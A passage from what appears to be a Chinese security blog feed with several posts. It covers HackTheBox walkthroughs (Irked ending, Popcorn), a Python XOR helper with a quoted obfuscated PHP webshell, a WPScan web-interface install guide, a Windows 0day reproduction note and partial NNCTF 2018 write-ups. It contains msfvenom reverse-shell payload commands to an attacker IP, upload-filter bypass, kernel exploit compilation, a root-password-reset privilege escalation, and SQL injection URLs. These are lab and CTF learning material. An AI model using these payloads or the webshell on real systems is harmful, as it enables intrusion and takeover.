class="hljs-built_in">set</span> LHOST 10.10.13.129  <span class="hljs-comment">#kali</span><br>run<br></code></pre></td></tr></table></figure><p>成功得到shell会话</p><p><img src="https://ae01.alicdn.com/kf/HTB1JmWjaBGw3KVjSZFw762Q2FXaL.png" alt=""></p><p>为了方便，这里使用python弹个交互式的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>寻找flag（user.txt）</p><p>经过查找，发现 <code>user.txt</code> 在另外一个用户 <code>Documents</code>目录下，但现在的用户无法cat user.txt。后面检查了当前用户执行过的命令，发曾经cat过和user.txt同目录下的<code>.backup</code>文件。当我cat该文件时，提示这个是备份密码。尝试ssh却发现密码错误无法登录。</p><p><img src="https://ae01.alicdn.com/kf/HTB1bzufaBWD3KVjSZKP761p7FXaj.png" alt=""></p><p>后面在官方论坛该靶机板块下找到了些提示：<code>Stego工具应与密码一起使用，首先找到Stego秘密吗，然后使用流行的Stego工具</code> (机器翻译的勉强看吧)。</p><p>按照提示，猜测应该是用类似 <code>MP3Stego</code> 之类的工具输入密码解密从而得到新的文件。后面在网上搜索到了kali上有个<code>steghide</code>的工具可以解密</p><p>安装steghide</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install steghide<br></code></pre></td></tr></table></figure><p>在解密前，先把<code>web</code>站点上的那张黄脸图片下载到本地然后使用以下命令并输入密码解密，密码为<code>.backup</code>里面<code>UP</code>的开头的字符串，然后得到个<code>pass.txt</code>，文件内容就是另一个用户的ssh登录密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf irked.jpg<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1lsqfaAWE3KVjSZSy760ocXXaR.png" alt=""></p><p>提权cat roo.txt</p><p>查找可利用带有SUID的文件、命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -l &#123;&#125; \;<br></code></pre></td></tr></table></figure><p>发现个可疑的<code>viewuser</code>命令，执行该命令报错提示找不到<code>/tmp/listusers</code>，嗯，这里利用在/tmp下创建一个名为<code>listusers</code>的sh脚本。脚本里面可以写入增加个特权用户、修改root密码或者把当前用户加入到管理员组之类的命令</p><p><img src="https://ae01.alicdn.com/kf/HTB1OH5daxiH3KVjSZPf760BiVXaU.png" alt=""></p><p>这里我写入修改root密码，sh脚本命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">echo</span> root:Aa@1234567890 | /usr/sbin/chpasswd<br></code></pre></td></tr></table></figure><p>修改权限为777，然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 listusers<br>/usr/bin/viewuser`<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1bPefaBWD3KVjSZKP761p7FXaJ.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-Popcorn</title>
    <link href="/posts/111fdf1c.html"/>
    <url>/posts/111fdf1c.html</url>
    
    <content type="html"><![CDATA[<p>目标: 在靶机中找到user.txt和root.txt文件</p><h3 id="信息收集">信息收集</h3><p>用nmap扫描端口信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[root@parrot]─[~]<br>└──╼ <span class="hljs-comment">#nmap -sC -sV 10.10.10.6</span><br>Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-16 13:29 EST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.6<br>Host is up (0.24s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)<br>|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)<br>80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))<br>|_http-server-header: Apache/2.2.12 (Ubuntu)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 17.66 seconds</span><br></code></pre></td></tr></table></figure><p>只开了<code>22</code>和<code>80</code>端口</p><p>先使用dirb爆破80端口web服务目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://10.10.10.6/ -r<br></code></pre></td></tr></table></figure><h3 id="利用">利用</h3><p>找到以下目录，其中<code>test</code>下是个phpinfo</p><p><img src="https://ae01.alicdn.com/kf/HTB18uKeawmH3KVjSZKz7622OXXau.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1bjelaBCw3KVjSZR0762cUpXa0.png" alt=""></p><p><code>torrent</code> 文件夹比较可疑，浏览器访问<code>http://10.10.10.3/torrent/</code></p><p>简单的浏览了下，发现有上传文件功能。先注册个帐号</p><p><img src="https://ae01.alicdn.com/kf/HTB1rdWeawmH3KVjSZKz7622OXXaI.png" alt=""></p><p>完成注册后上传一个<code>.torrent</code>文件,上传成功后跳转到一下页面，点击<code>Edit this torrent</code>按钮，弹出一个可以上传图片的窗口</p><p><img src="https://ae01.alicdn.com/kf/HTB1aCOgaBWD3KVjSZFs763qkpXaM.png" alt=""></p><p>先使用msf生成一个反向链接 payload，然后修改尾缀名为<code>.png</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw &gt;test.php<br><span class="hljs-built_in">mv</span> test.php test.php.png<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1OLKlaBCw3KVjSZFl763JkFXat.png" alt=""></p><p>burp捉包删除尾缀名<code>.png</code>,然后上传</p><p><img src="https://ae01.alicdn.com/kf/HTB1egCgaBaE3KVjSZLe760sSFXah.png" alt=""></p><p>找到上传文件所在目录，一般在<code>upload/</code>下</p><p><img src="https://ae01.alicdn.com/kf/HTB1kmyeav5G3KVjSZPx762I3XXa1.png" alt=""></p><p>设置msf监听,然后浏览器打开上传的php <code>shell</code>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 10.10.14.6<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1YYKhaBSD3KVjSZFq7634bpXat.png" alt=""></p><p>成功反弹shell</p><p>查看系统信息，linux内核为版本<code>2.6.31-14</code>，查找提权exp，这里使用<code>15704.c</code>进行编译提权获取shell会话。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Linux 2.6.3<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1z4ifaEGF3KVjSZFo762mpFXau.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1TgWfaEGF3KVjSZFo762mpFXad.png" alt=""></p><h3 id="提权">提权</h3><p>把exp上传到目标机上进行编译，提权，cat flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">upload /usr/share/exploitdb/exploits/linux/local/15704.c .<br>shell<br><span class="hljs-built_in">ls</span><br>gcc 15704.c -o exp<br><span class="hljs-built_in">chmod</span> 777 exp &amp;&amp; ./exp<br>./exp<br><span class="hljs-built_in">ls</span> /home<br><span class="hljs-built_in">cat</span> /home/george/user.txt<br><span class="hljs-built_in">cat</span> /root/root.txt<br><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1i91faA9E3KVjSZFG76319XXa7.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python string XOR</title>
    <link href="/posts/b5a2e443.html"/>
    <url>/posts/b5a2e443.html</url>
    
    <content type="html"><![CDATA[<p>这几天即刻群里的师傅们都讨论PHP shell如何改装从而存活下来，由于自己太菜只能，默默的听大佬们讨论不敢吱声 ~ Orz<br>听大佬们讨论，什么用<code>fopen</code>加载txt里php，<code>xor</code>Str 然后组合之类，听得我一脸懵逼的 0.0  特别是<code>xor</code>,完全不知道那是什么，去查了下php的手册，看完后对于php烂成没模样的我来说更加懵逼了~</p><p>后面在九世师傅的Blog翻到一篇 <a href="https://422926799.github.io/2019/01/18/No-character-shell-study/"><strong>No character shell study</strong></a></p><p>后面在九世的Blog翻到一篇 <a href="https://422926799.github.io/2019/01/18/No-character-shell-study/"><strong>No character shell study</strong></a></p><p><img src="https://ae01.alicdn.com/kf/HTB1qSShaEuF3KVjSZK9q6zVtXXay.jpg" alt=""></p><blockquote><p>异或运算是指，取每个字符的ASCII，转成二进制再做运算，运二进制算结果转成ASCII，然后再转成字符串</p></blockquote><p>看到这个，才算数明白了些。但是，怎么知道哪些字符串进行异或运算后会得到我想要的新的字符串呢？于是Google了一波，找到了【通过查ASCII表的符合和字符的异或，打印出所有可能的组合】的py脚本，把轮子扣下来小小修改了一下，唔，very good，这就是我想要的。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br>str1_AScII = <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>str2_AScII = <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br>result_ASCII = <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">127</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Waiting for create the dicts...&quot;</span>)<br>dict_key = []<br>dict_value = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1_AScII:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> str2_AScII:<br>        <span class="hljs-keyword">if</span> i ^ j <span class="hljs-keyword">in</span> result_ASCII:<br>            dict_key.append((i, j, <span class="hljs-built_in">chr</span>(i), <span class="hljs-built_in">chr</span>(j)))<br>            dict_value.append(<span class="hljs-built_in">chr</span>(i ^ j))<br><br>dicts = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(dict_key, dict_value))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] OK,The dicts is create&quot;</span>)<br><br>YourStr = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[-] Enter the string to be XORed: &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] YourStr is : %s\n&quot;</span> % (YourStr))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> YourStr:<br>    count = <span class="hljs-number">5</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;============ &quot;</span> + <span class="hljs-string">&quot;[&quot;</span> + i + <span class="hljs-string">&quot;]&quot;</span> + <span class="hljs-string">&quot; Can following composition ========&quot;</span>)<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> dicts.items():<br>        <span class="hljs-keyword">if</span> count != <span class="hljs-number">0</span>: <span class="hljs-comment"># 只遍历输出前五个异或结果</span><br>            <span class="hljs-keyword">if</span> v == <span class="hljs-string">&quot;%s&quot;</span> % i:<br>                <span class="hljs-keyword">if</span> (k[<span class="hljs-number">0</span>] <span class="hljs-keyword">in</span> result_ASCII) <span class="hljs-keyword">and</span> (k[<span class="hljs-number">1</span>] <span class="hljs-keyword">in</span> result_ASCII):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&quot;%s&quot; ^ &quot;%s&quot;&#x27;</span> % (k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>]))<br>                    count -= <span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1A5ihavWG3KVjSZFg762TspXa6.png" alt=""></p><p>然后开始看着轮子造轮子。</p><p>然而，想造个好点的轮子，php太菜了弄了半天没弄出来，就弄了个最简单的一句话<code>xor</code> （晕）。。。。。。。</p><p>这里有个bug，拿九世师傅的造的小马，在本地环境上居然跑不起来，PHP直接是报错的。。。从此对php的好感又降了一级。 :P不知道是不是环境的问题，等后面再看了。</p><p>附上九世师傅的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_0</span> = (<span class="hljs-string">&quot;!&quot;</span>^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-string">&quot;3&quot;</span>^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-string">&quot;3&quot;</span>^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-string">&quot;%&quot;</span>^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-string">&quot;2&quot;</span>^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-string">&quot;4&quot;</span>^<span class="hljs-string">&quot;@&quot;</span>); <span class="hljs-comment">/*assert*/</span><br><span class="hljs-variable">$_1</span> = <span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;10&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;0F&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;13&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>).(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-string">&quot;14&quot;</span>)^<span class="hljs-string">&quot;@&quot;</span>);<br><span class="hljs-variable">$_2</span> = <span class="hljs-variable">$$_1</span>;<br><span class="hljs-variable">$_0</span>(<span class="hljs-variable">$_2</span>[_]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPScan Web Interface</title>
    <link href="/posts/1dd3590f.html"/>
    <url>/posts/1dd3590f.html</url>
    
    <content type="html"><![CDATA[<p>该工具作者对 WPScan Web Interface 功能描述如下：</p><blockquote><p>用于运行和调度由wpscan实用程序提供支持的WordPress扫描的集中式仪表板。它具有以下功能：<br><strong>1、登录页面 -</strong><br>访问应用程序需要身份验证。<br><strong>2、仪表板页面 -</strong><br>按需扫描：通过提供URL或文本文件立即运行扫描，该URL具有由新行分隔的多个URL作为输入。<br>扫描历史记录：查看或删除扫描历史记录和报告。<br>计划扫描：将扫描配置为自动运行，或者像Linux中的cron作业一样定期运行。<br>预设扫描历史记录：编辑cron规则或删除任何预定扫描。<br><strong>3、报告页面-</strong><br>查看或打印扫描完成后发现的漏洞的详细信息。</p></blockquote><p>详细请转到 <a href="https://github.com/cyc10n3/WPScan_Web_Interface/blob/master/README.md">https://github.com/cyc10n3/WPScan_Web_Interface/blob/master/README.md</a></p><p>以下是我安装环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">OS：Parrot x86_64 GNU/Linux（基于Debian）<br>nodejs：v8.11.2<br>npm：5.8.0<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1KJl_Xkxz61VjSZFr760eLFXaS.png" alt=""></p><p>由于我所用的系统没有 <code>npm</code> 所以执行以下命令进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get install npm<br></code></pre></td></tr></table></figure><p>使用Git下载 <code>WPScan Web Interface</code> 到本地进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/cyc10n3/WPScan_Web_Interface.git<br><br>$ <span class="hljs-built_in">cd</span> WPScan_Web_Interface<br><br>$ sudo npm install<br><br>$ sudo npm start<br></code></pre></td></tr></table></figure><p>浏览器打开 <a href="https://localhost:1337">https://localhost:1337</a>，默认用户密码为：<code>admin/cyc10n3</code> 可在该工具文件夹下的<code>config.json</code> 修改密码。</p><p><img src="https://ae01.alicdn.com/kf/HTB14TWpaBCw3KVjSZFl763JkFXaC.png" alt=""></p><p><strong>登录页面</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1gDWpaBCw3KVjSZFl763JkFXak.png" alt=""></p><p><strong>主页面–Scan</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB15mOiav1H3KVjSZFH762KppXa7.png" alt=""></p><p><strong>定时扫描</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1OLSsarus3KVjSZKb760qkFXaS.png" alt=""></p><p><strong>扫描结果</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB1tKekaA9E3KVjSZFG76319XXai.png" alt=""></p><p><strong>后台状态</strong></p><p><img src="https://ae01.alicdn.com/kf/HTB16FmjawaH3KVjSZFj763FWpXao.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>资源分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>wpscan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows任意文件读取0day复现</title>
    <link href="/posts/db84c847.html"/>
    <url>/posts/db84c847.html</url>
    
    <content type="html"><![CDATA[<p><font color=#1bcc7c size=7>前言</font></p><blockquote><p>最近国外安全研究员 SandboxEscaper又一次在推特上公布了新的Windows 0 day漏洞细节及PoC。此次披露的漏洞可造成任意文件读取。该漏洞可允许低权限用户或恶意程序读取目标Windows主机上任意文件的内容，但不可对文件进行写入操作。所有windows系列都将受此漏洞影响。</p></blockquote><p>一个普通用户 <code>read</code> 正常情况下是不能访问其他用户的家目录的。</p><p><img src="https://ae01.alicdn.com/kf/HTB10MykaBaE3KVjSZLe760sSFXaZ.png" alt=""></p><p>以下使用 <code>SandboxEscaper</code> 大牛公布的PoC可以绕过并成功读取另外一个用户在桌面上的文件。</p><p><img src="https://ae01.alicdn.com/kf/HTB1puysarys3KVjSZFn760FzpXah.png" alt=""></p><p>成功读取txt文件</p><p><img src="https://ae01.alicdn.com/kf/HTB10wykaBaE3KVjSZLe760sSFXaX.png" alt=""></p><p>大牛的博客以及PoC地址：<br><a href="https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html">https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html</a></p><p>复现参考链接：<br><a href="https://thehackernews.com/2018/12/windows-zero-day-exploit.html">https://thehackernews.com/2018/12/windows-zero-day-exploit.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NNCTF-2018(部分)</title>
    <link href="/posts/1137788d.html"/>
    <url>/posts/1137788d.html</url>
    
    <content type="html"><![CDATA[<h2 id="WEB">WEB:</h2><h3 id="超简单的web题">超简单的web题</h3><p>直接截断拿到flag</p><p><code>http://gxnnctf.gxsosec.cn:12311/?no=1%00-</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1y.mkaBiE3KVjSZFM762QhVXa5.png" alt=""></p><h3 id="Sqli">Sqli???</h3><p>看看这边<code>/.git/</code>返回403 感觉存在<code>git漏洞</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1n1mjav1H3KVjSZFH762KppXaI.png" alt=""></p><p>随后用python恢复一下git文件恢复。</p><p><img src="https://ae01.alicdn.com/kf/HTB1vWOkaEKF3KVjSZFE760ExFXau.png" alt=""></p><p>可以看到验证了git文件泄露的存在， 跑出来一个<code>index.php </code></p><p><img src="https://ae01.alicdn.com/kf/HTB1v_mjav5G3KVjSZPx762I3XXat.png" alt=""></p><p>对<code>index.php</code>代码审计</p><p><img src="https://ae01.alicdn.com/kf/HTB1zOKqaBCw3KVjSZR0762cUpXay.png" alt=""></p><p><code>if($username === 'guest')&#123;    if($username === 'admin')&#123; </code></p><p>条件是两个查询 一个是<code>guest </code>一个是<code>admin</code> 可见可能是利用条件语句来查询数据库。</p><p><code>if(preg_match('#sleep|benchmark|floor|rand|count|select|from|\(|\)|time|date|sec|day#is',$ip))&#123;</code></p><p>以上也可见过滤了括号等等。</p><p>Sql绕过</p><p>看源码感觉是第一次查询为<code>guest</code>第二次查询为<code>admin</code><br>那我们是不是可以使用<code>mysql</code>的变量绕过这个，第一次查询变量值为<code>1</code>，第二次变量查询值为<code>2</code> ，可以想到使用<code>case when @x is null then @x:=2 ELSE @x:=1</code>。<br>执行同样的语句，第一次为<code>guest</code></p><p><img src="https://ae01.alicdn.com/kf/HTB12r5kavWG3KVjSZPc762kbXXan.png" alt=""></p><p>第二次变量赋值为<code>x=1</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1ljClaCSD3KVjSZFK76210VXal.png" alt=""></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//gxnnctf.gxsosec.cn:<span class="hljs-number">12312</span>/index.php?backdoor<span class="hljs-operator">=</span>Melonrind&amp;id<span class="hljs-operator">=</span>case<span class="hljs-variable">%20</span>when<span class="hljs-variable">%20</span><span class="hljs-title">@x</span><span class="hljs-variable">%20</span>IS<span class="hljs-variable">%20</span>NULL<span class="hljs-variable">%20</span>THEN<span class="hljs-variable">%20</span><span class="hljs-title">@x</span>:<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-variable">%20</span>ELSE<span class="hljs-variable">%20</span><span class="hljs-title">@x</span>:<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%20</span><span class="hljs-keyword">end</span> <br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1kJekaEGF3KVjSZFm762qPXXal.png" alt=""></p><h3 id="白帽子商城">白帽子商城</h3><p>分析：注册新账号，初始金额1000刀，要购买帽子，一级帽子500刀，购买成功则提升一级，帽子的价格也随之上调1$.购买第一个帽子后，就发现余额不足以继续购买了.</p><p><img src="https://ae01.alicdn.com/kf/HTB1kK1kaECF3KVjSZJn762nHFXaD.png" alt=""></p><p>重新注册个新账号，尝试条件竞争，打开burp，点击购买，抓取数据</p><p><img src="https://ae01.alicdn.com/kf/HTB18EKjavWG3KVjSZFg762TspXax.png" alt=""></p><p>发送到Intruder，点击Positions，点击clea，点击Payload，选择类型为Null，调大线程和发送次数</p><p><img src="https://ae01.alicdn.com/kf/HTB1.ZqlaA5E3KVjSZFC762uzXXaX.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1uLOjaxiH3KVjSZPf760BiVXai.png" alt=""></p><p>发现竞争失败。</p><p>后面测试，发现修改【order】的参数可以免费购买帽子，但是始终绕不过购买第二个帽子<br>于是，猜想这里应该存在条件竞争，那再新注册个账号，修改数据先达到购买第二个帽子的页面，这里使用脚本来登录两个会话同时进行购买帽子</p><p><img src="https://ae01.alicdn.com/kf/HTB1wJqkaEWF3KVjSZPh760clXXaI.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1a6KlaCSD3KVjSZFK76210VXax.png" alt=""></p><p>使用脚本同时购买第二个帽子</p><p><img src="https://ae01.alicdn.com/kf/HTB1Ob9laBGE3KVjSZFh763kaFXal.png" alt=""></p><p>刷新浏览器，已经get到flag</p><p><img src="https://ae01.alicdn.com/kf/HTB127alaBOD3KVjSZFF763n9pXay.png" alt=""></p><h2 id="MISC">MISC:</h2><h3 id="这是啥">这是啥</h3><p>尝试了栅栏密码和凯撒密码，发现有点像凯撒密码</p><p><img src="https://ae01.alicdn.com/kf/HTB1xaGtaqWs3KVjSZFx761WUXXaF.png" alt=""></p><p>GFE-YLCERCNSNLA-AIX{N-PYNET-TSTMYRA}<br>把上面这一串分为6组6个字符串</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">GFE-YL<br>CERCNS<br>NLA-AI<br>X&#123;N-PY<br>NET-TS<br>TMYRA&#125; <br></code></pre></td></tr></table></figure><p>每组按照<code>143526</code>的顺序排序，最后拿到flag</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">GXNNCT F&#123;LEEM ENATRY ----CR YPATNA LYISS&#125;<br></code></pre></td></tr></table></figure><h3 id="MISC2">MISC2</h3><p>分析：</p><p>解压下载的压缩包，发现里面有<code>40个flag.zip</code>包，并且每个压缩包文件都有3个字节大小的名为<code>flag.txt</code>的文件。那就尝试<code>crc32</code>碰撞看看能不能还原压缩包里面的内容。</p><p><img src="https://ae01.alicdn.com/kf/HTB1YmGjav5G3KVjSZPx762I3XXa0.png" alt=""></p><p>从网上搜索一波，看看有没有相似的，于是找到一遍文章<code>https://www.cnblogs.com/WangAoBo/p/6951160.html</code>，直接拿现成脚本代码来跑。</p><p><img src="https://ae01.alicdn.com/kf/HTB1Q0ikaEWF3KVjSZPh760clXXaF.png" alt=""></p><p>这里坑啊，跑了半天什么都没跑出来。后来仔细审了下该脚本，脚本里的CrackCrc()有<code>4个for循环</code>，对应的应该是压缩包里的大小为<code>4</code>个字节的文件，但是现有的压缩包大小是<code>3</code>个字节，于是修改下代码去掉一个for循环， 最终脚本，如下：</p><p><img src="https://ae01.alicdn.com/kf/HTB1VbytaqSs3KVjSZPi763siVXaU.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1L5CqaBCw3KVjSZR0762cUpXah.png" alt=""></p><p>What，这是什么啊，新手的我一脸懵逼。后面baidu、Google了一波，原来这个是ASCII码，把ASCII转换成对应的字符串，然后再base64解码即可。</p><p><img src="https://ae01.alicdn.com/kf/HTB1HcymaBSD3KVjSZFq7634bpXav.png" alt=""></p><h3 